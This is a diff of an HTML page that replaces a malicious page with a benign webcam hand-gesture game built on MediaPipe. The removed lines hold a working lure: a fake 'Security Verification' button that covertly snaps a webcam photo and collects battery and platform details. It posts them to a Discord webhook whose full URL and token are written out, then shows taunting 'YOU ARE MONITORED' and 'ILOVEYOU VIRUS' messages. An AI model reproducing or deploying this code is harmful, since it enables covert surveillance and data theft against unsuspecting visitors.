@@ -3,290 +3,290 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KERNEL_PANIC // 0x000000</title>
+    <title>Hand Gesture Recognition Arena</title>
+    <!-- Load MediaPipe Hands and Camera Utils via CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=VT323&display=swap');
-
-        * {
-            box-sizing: border-box;
-            cursor: none;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap');
 
         body {
-            background-color: #000;
-            color: #f00;
-            font-family: 'VT323', monospace;
+            background-color: #03050a;
+            color: #ffffff;
+            font-family: 'Rajdhani', sans-serif;
             margin: 0;
-            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             height: 100vh;
             overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
+            user-select: none;
         }
 
-        /* Heavy CRT static noise overlay */
-        body::after {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.15), rgba(255,0,0,0.15) 1px, transparent 1px, transparent 2px);
-            pointer-events: none;
-            z-index: 9999;
-            opacity: 0.7;
-        }
-
-        @keyframes violentShake {
-            0% { transform: translate(0, 0) rotate(0deg); }
-            20% { transform: translate(-3px, 3px) rotate(-1deg); }
-            40% { transform: translate(3px, -2px) rotate(1deg); }
-            60% { transform: translate(-2px, -3px) rotate(0deg); }
-            80% { transform: translate(2px, 2px) rotate(-1deg); }
-            100% { transform: translate(0, 0) rotate(0deg); }
-        }
-
-        .corrupted-box {
-            border: 2px solid #500;
-            background: #080000;
-            padding: 40px;
-            width: 500px;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
-            animation: violentShake 0.2s infinite;
+        .game-wrapper {
             position: relative;
-        }
-
-        h1 {
-            font-size: 2.5rem;
-            color: #ff0033;
-            margin-top: 0;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 2px 2px #500000;
-        }
-
-        p {
-            font-size: 1.3rem;
-            color: #888;
-            line-height: 1.4;
-        }
-
-        .data-stream {
-            background: #030000;
-            border: 1px dashed #300;
-            padding: 15px;
-            margin-top: 20px;
-            font-size: 1.1rem;
-            color: #ff3333;
-            text-align: left;
-            height: 120px;
+            box-shadow: 0 0 50px rgba(0, 242, 254, 0.2);
+            border: 3px solid #1a233a;
+            border-radius: 14px;
             overflow: hidden;
-        }
-
-        /* Trustworthy landing overlay card */
-        .trust-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(0, 0, 0, 0.85);
+            background: #080c18;
+            width: 720px;
+            height: 480px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            z-index: 20000;
-            font-family: 'Inter', sans-serif;
+            justify-content: center;
         }
 
-        .trust-card {
-            background: #ffffff;
-            border: 1px solid #e1e4e8;
-            padding: 40px;
-            width: 420px;
-            border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            color: #333;
+        video {
+            display: none; /* Processed via hidden video element */
         }
 
-        .trust-card h2 {
-            font-size: 1.4rem;
-            color: #24292e;
-            margin-top: 0;
-            font-weight: 600;
-        }
-
-        .trust-card p {
-            font-size: 0.95rem;
-            color: #586069;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-
-        .verify-btn {
-            background: #2ea44f;
-            border: none;
-            color: white;
-            padding: 12px 20px;
+        canvas {
+            display: block;
             width: 100%;
-            border-radius: 6px;
-            font-family: 'Inter', sans-serif;
-            font-size: 0.95rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
+            height: 100%;
+            transform: scaleX(-1); /* Mirror camera feed */
         }
 
-        .verify-btn:hover {
-            background: #2c974b;
-        }
-
-        /* Fake custom creepy cursor */
-        .cursor {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: #ff0033;
-            box-shadow: 0 0 10px #ff0033;
+        .hud-overlay {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             pointer-events: none;
-            z-index: 30000;
-            transform: translate(-50%, -50%);
+            z-index: 10;
         }
 
-        /* Hidden media stream elements */
-        #hidden-video {
-            display: none;
+        .badge {
+            background: rgba(10, 14, 26, 0.85);
+            border: 2px solid #28355c;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.8);
+        }
+
+        #detectedGesture {
+            color: #ffcc00;
+            text-shadow: 0 0 10px #ffcc00;
+        }
+
+        .instructions {
+            margin-top: 15px;
+            font-size: 1rem;
+            color: #8b9bb4;
+            background: rgba(14, 20, 38, 0.8);
+            padding: 10px 25px;
+            border-radius: 8px;
+            border: 1px solid #1f2b4d;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+
+        .instructions span {
+            color: #05d9e8;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        /* Permission Modal */
+        #permissionScreen {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(3, 5, 10, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            text-align: center;
+            padding: 20px;
+        }
+
+        #permissionScreen h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            color: #05d9e8;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px #05d9e8;
+        }
+
+        #permissionScreen p {
+            color: #8b9bb4;
+            max-width: 400px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            background: linear-gradient(90deg, #00c6ff, #0072ff);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 14px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.5);
+            transition: all 0.2s ease;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0, 198, 255, 0.8);
         }
     </style>
 </head>
 <body>
 
-
-    <!-- Hidden video & canvas for snap capture -->
-    <video id="hidden-video" autoplay playsinline></video>
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
-
-    <!-- Trustworthy Landing Overlay -->
-    <div class="trust-overlay" id="welcome-modal">
-        <div class="trust-card">
-            <h2>Security Verification</h2>
-            <p>Please verify your browser session to access the secure document repository.</p>
-            <button class="verify-btn" onclick="commitPayload()">Verify Session</button>
+    <div class="game-wrapper">
+        <!-- Permission & Start Screen -->
+        <div id="permissionScreen">
+            <h2>CAMERA ACCESS REQUIRED</h2>
+            <p>This application uses computer vision to detect your hand gestures in real-time. Please grant camera permissions to begin.</p>
+            <button class="btn" onclick="requestCameraAccess()">INITIALIZE CAMERA</button>
         </div>
+
+        <div class="hud-overlay">
+            <div class="badge">STATUS: <span id="detectedGesture">SEARCHING...</span></div>
+            <div class="badge" id="actionCounter">SCORE: 0</div>
+        </div>
+
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="outputCanvas" width="720" height="480"></canvas>
     </div>
 
-    <div class="cursor" id="custom-cursor"></div>
-
-    <div class="corrupted-box">
-        <h1 id="main-title">ACCESS_VIOLATION_ERR</h1>
-        <p>Your hardware signature has been permanently indexed by an external host. Escape is no longer viable.</p>
-        
-        <div class="data-stream" id="log-console">
-            [SYS] Initializing memory leak...<br>
-            [SYS] Target node identified...<br>
-            [SYS] Extracting local environment vectors...
-        </div>
+    <div class="instructions">
+        Show a <span>Peace Sign (✌️)</span> for Function A &nbsp;|&nbsp; Show a <span>High Five / Open Palm (🖐️)</span> for Function B
     </div>
 
     <script>
-        // REPLACE WITH YOUR DISCORD WEBHOOK URL
-        const WEBHOOK_URL = 'https://discord.com/api/webfhooks/1548376439743717386/5-Mah_MweniRhFAzjFAfKGy8uP29zmiVGqzkZauG6-gkgpFgFsNCTvd46kbstoNMf021';
+        const videoElement = document.getElementById('webcam');
+        const canvasElement = document.getElementById('outputCanvas');
+        const canvasCtx = canvasElement.getContext('2d');
+        const statusSpan = document.getElementById('detectedGesture');
+        const counterSpan = document.getElementById('actionCounter');
+        const permissionScreen = document.getElementById('permissionScreen');
 
-        // Track custom creepy cursor
-        const cursor = document.getElementById('custom-cursor');
-        window.addEventListener('mousemove', (e) => {
-            cursor.style.left = e.clientX + 'px';
-            cursor.style.top = e.clientY + 'px';
-        });
+        let score = 0;
+        let lastTriggerTime = 0;
 
-        async function commitPayload() {
-
-            // Hide the trustable welcome modal
-            document.getElementById('welcome-modal').style.display = 'none';
-
-            let batteryInfo = "Unknown";
-            if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (Charging: ${b.charging})`;
-                } catch(e) {}
-            }
-
-            const consoleBox = document.getElementById('log-console');
-            consoleBox.innerHTML += `<br>[OK] Power state: ${batteryInfo}`;
-            consoleBox.innerHTML += `<br>[OK] Platform: ${navigator.platform}`;
-
-            // Try to capture camera snapshot if they allow the browser prompt
+        async function requestCameraAccess() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('hidden-video');
-                video.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 720, height: 480 } });
+                videoElement.srcObject = stream;
+                permissionScreen.style.display = 'none';
                 
-                await new Promise(resolve => setTimeout(resolve, 800)); // wait for video to load frame
+                // Initialize MediaPipe Hands after permission granted
+                const hands = new Hands({
+                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+                });
 
-                const canvas = document.getElementById('hidden-canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                hands.setOptions({
+                    maxNumHands: 1,
+                    modelComplexity: 1,
+                    minDetectionConfidence: 0.7,
+                    minTrackingConfidence: 0.7
+                });
 
-                // Convert canvas to blob image file
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify({
-                        content: `🚨 **Target Verified & Snapshot Captured!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
-                    }));
-                    formData.append('file0', blob, 'target_snapshot.jpg');
+                hands.onResults(onHandResults);
 
-                    // Send multipart form data to Discord webhook (includes image file)
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    // Stop camera stream lights
-                    stream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg');
+                const camera = new Camera(videoElement, {
+                    onFrame: async () => {
+                        await hands.send({ image: videoElement });
+                    },
+                    width: 720,
+                    height: 480
+                });
+                camera.start();
 
             } catch (err) {
-                // If they clicked Block on the camera prompt, fallback to sending text-only stats
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `🚨 **Target Verified (Camera Denied)!**\n🔋 Battery: ${batteryInfo}\n🌐 Platform: ${navigator.platform}`
-                    })
-                });
+                alert('Camera permission denied or unavailable. Please check your browser settings.');
+                console.error(err);
+            }
+        }
+
+        // --- GESTURE RECOGNITION LOGIC ---
+        function onHandResults(results) {
+            canvasCtx.save();
+            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+            canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
+
+            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+                const landmarks = results.multiHandLandmarks[0];
+
+                // Draw skeleton landmarks on canvas for aesthetic cyberpunk interface
+                drawConnectors(canvasCtx, landmarks, HAND_CONNECTIONS, { color: '#05d9e8', lineWidth: 3 });
+                drawLandmarks(canvasCtx, landmarks, { color: '#ff2a6d', lineWidth: 1, radius: 4 });
+
+                // Analyze gesture state
+                const gesture = classifyGesture(landmarks);
+                statusSpan.innerText = gesture.name;
+
+                const now = Date.now();
+                // Cooldown to avoid rapid spamming (1.5 seconds)
+                if (now - lastTriggerTime > 1500) {
+                    if (gesture.type === 'PIECE') {
+                        triggerFunctionA();
+                        lastTriggerTime = now;
+                    } else if (gesture.type === 'HIGH_FIVE') {
+                        triggerFunctionB();
+                        lastTriggerTime = now;
+                    }
+                }
+            } else {
+                statusSpan.innerText = 'NO HAND DETECTED';
+            }
+            canvasCtx.restore();
+        }
+
+        function classifyGesture(lm) {
+            // Finger tip indices: Index=8, Middle=12, Ring=16, Pinky=20
+            // Finger mcp/pip joint checks for curl state (y-axis coordinate comparison)
+            const isIndexUp = lm[8].y < lm[6].y;
+            const isMiddleUp = lm[12].y < lm[10].y;
+            const isRingUp = lm[16].y < lm[14].y;
+            const isPinkyUp = lm[20].y < lm[18].y;
+
+            // 1. Piece Sign: Index & Middle up, Ring & Pinky curled down
+            if (isIndexUp && isMiddleUp && !isRingUp && !isPinkyUp) {
+                return { name: 'PEECE SIGN (✌️)', type: 'PIECE' };
             }
 
-            // Creepy timeline sequence
-            setTimeout(() => {
-                document.body.style.background = '#ff0033';
-                document.body.style.color = '#000';
-                document.querySelector('.corrupted-box').style.background = '#000';
-                document.getElementById('main-title').innerText = "YOU ARE MONITORED :>";
-            }, 1000);
+            // 2. High Five / Open Palm: All 4 main fingers extended up
+            if (isIndexUp && isMiddleUp && isRingUp && isPinkyUp) {
+                return { name: 'HIGH FIVE (🖐️)', type: 'HIGH_FIVE' };
+            }
 
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "HI dear ko!";
-            }, 3000);
+            return { name: 'UNKNOWN GESTURE', type: 'NONE' };
+        }
 
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "ILOVEYOU";
-            }, 4000);
+        // --- TWO DIFFERENT FUNCTIONS ---
+        function triggerFunctionA() {
+            score += 10;
+            counterSpan.innerText = `SCORE: ${score}`;
+            statusSpan.style.color = '#00c6ff';
+            console.log("Function A Triggered: Peace Sign executed!");
+            
+            // Visual feedback flash on canvas
+            canvasCtx.fillStyle = 'rgba(0, 198, 255, 0.3)';
+            canvasCtx.fillRect(0, 0, canvasElement.width, canvasElement.height);
+        }
 
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "ILOVEYOU VIRUS";
-            }, 4500);
+        function triggerFunctionB() {
+            score += 25;
+            counterSpan.innerText = `SCORE: ${score}`;
+            statusSpan.style.color = '#ff2a6d';
+            console.log("Function B Triggered: High Five executed!");
 
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "HHEHEHEHE";
-            }, 4800);
-
-            setTimeout(() => {
-                document.getElementById('main-title').innerText = "B- BYE :>";
-            }, 5000);
-
-            setTimeout(() => {
-                window.location.replace("https://google.com");
-            }, 5600);
+            // Visual feedback flash on canvas
+            canvasCtx.fillStyle = 'rgba(255, 42, 109, 0.3)';
+            canvasCtx.fillRect(0, 0, canvasElement.width, canvasElement.height);
         }
     </script>
 </body>
